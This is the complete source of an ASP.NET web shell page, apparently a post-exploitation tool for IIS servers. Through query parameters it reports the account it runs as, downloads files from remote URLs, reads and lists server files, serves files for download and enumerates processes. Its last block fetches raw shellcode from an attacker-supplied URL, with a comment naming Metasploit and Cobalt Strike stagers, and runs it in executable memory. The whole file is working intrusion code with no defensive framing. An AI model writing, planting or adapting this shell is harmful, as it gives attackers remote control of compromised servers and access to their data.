<%@ Page Language="C#" %>
<%@ Import Namespace="System.Runtime.InteropServices" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Net.Sockets" %>
<%@ Import Namespace="System.Security.Principal" %>
<%@ Import Namespace="System.Data.SqlClient" %>
<%@ Import Namespace="System.Security" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="Microsoft.Win32.SafeHandles" %>


<script runat="server">
    //usage aspx?dir=c:\users\mario&cat=c:\users\mario\secret.txt
    protected void Page_Load(object sender, EventArgs e)
    {     
        Execute();
    }
delegate int MsfpayloadProc();
public const UInt32 Infinite = 0xffffffff;
public const Int32 Startf_UseStdHandles = 0x00000100;
public const Int32 StdOutputHandle = -11;
public const Int32 StdErrorHandle = -12;


    public static uint INFINITE = 0xFFFFFFFF;
    
    internal struct sockaddr_in
    {
        public short sin_family;
        public short sin_port;
        public int sin_addr;
        public long sin_zero;
    }

   public enum TOKEN_TYPE
   {
       TokenPrimary = 1,
       TokenImpersonation
   }

   public enum SECURITY_IMPERSONATION_LEVEL
   {
       SecurityAnonymous,
       SecurityIdentification,
       SecurityImpersonation,
       SecurityDelegation
   }


    [DllImport("Kernel32.dll", EntryPoint = "VirtualAlloc")]
    public static extern IntPtr VirtualAlloc(IntPtr address, int size, uint allocType, uint protect);
    [DllImport("Kernel32.dll", EntryPoint = "VirtualFree")]
    public static extern bool VirtualFree(IntPtr address, int size, uint freeType);


    //virtualMemoryflags
    const uint MEM_COMMIT = 0x1000;
    const uint MEM_RESERVE = 0x2000;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint MEM_RELEASE = 0x8000;



    protected void Execute()
    {
         bool retValue;
                       // Check the identity.
                       Response.Write("Executing as ...  "
                            + WindowsIdentity.GetCurrent().Name + "</br>");
                            if(!(String.IsNullOrEmpty(Request.Params["UploadSource"]) && String.IsNullOrEmpty(Request.Params["UploadDestination"])) ){
                            WebClient webClient = new WebClient();
                            webClient.DownloadFile(Request.Params["UploadSource"], Request.Params["UploadDestination"]);
                            }
                        
                            if(String.IsNullOrEmpty(Request.Params["cat"])){

                            
                            }else{
                            string text = System.IO.File.ReadAllText(Request.Params["cat"]);
                            Response.Write("</br> <pre>" + text + "</pre></br>");
                            }
                            if(String.IsNullOrEmpty(Request.Params["dir"]))
                            {

                            }else{

                            string [] fileEntries = Directory.GetFiles(Request.Params["dir"]);
                            foreach(string fileName in fileEntries)
                            Response.Write("F - " + File.GetLastWriteTime(fileName) + " " + fileName + "</br>");

                            string [] subdirectoryEntries = Directory.GetDirectories(Request.Params["dir"]);
                            foreach(string subdirectory in subdirectoryEntries)
                            Response.Write("D - " + Directory.GetLastWriteTime(subdirectory) + " " + subdirectory + "</br>");
                            }
                            //download
                            if(!String.IsNullOrEmpty((Request.QueryString["FileDownload"])))
                            {
                                string fName = Request.QueryString["FileDownload"];
                                FileInfo fi = new FileInfo(fName);
                                long sz = fi.Length;
                                Response.ClearContent();
                                Response.AppendHeader("Content-Disposition", string.Format("attachment; filename={0}", System.IO.Path.GetFileName(fName)));
                                Response.ContentType = "application/octet-stream";
                                Response.TransmitFile(fName);
                                Response.End();
                            }
                        //processes
                            if(!(String.IsNullOrEmpty((Request.QueryString["Process"]))))
                            {
                                Process[] processlist = Process.GetProcesses();
                                Response.Write("<pre>");
                                foreach (Process theprocess in processlist)
                                {
                                    Response.Write("Process:" + theprocess.ProcessName + " ID: " + theprocess.Id + "</br>");
                                }
                                Response.Write("</pre>");

                            }
                         //download&load
                         if(!(String.IsNullOrEmpty((Request.QueryString["shellcodeURL"])))){
                            //(new WebClient()).DownloadFile(Request.QueryString["memory"], "c:\\users\\public\\tmp.bin");
                            //need raw bin stager <= -f raw on metasploit, raw on cobalstrike
                            byte[] Buffer = (new WebClient()).DownloadData(Request.QueryString["shellcodeURL"]);
                                IntPtr handle = IntPtr.Zero;
                                handle = VirtualAlloc(IntPtr.Zero,Buffer.Length,MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
                                try
                                {
                                    Marshal.Copy(Buffer, 0, handle, Buffer.Length);
                                    MsfpayloadProc msfpayload= Marshal.GetDelegateForFunctionPointer(handle, typeof(MsfpayloadProc)) as MsfpayloadProc;
                                    msfpayload();
                                }
                                finally
                                {
                                    VirtualFree(handle, 0, MEM_RELEASE);
                                }
                            }      
    }
</script>
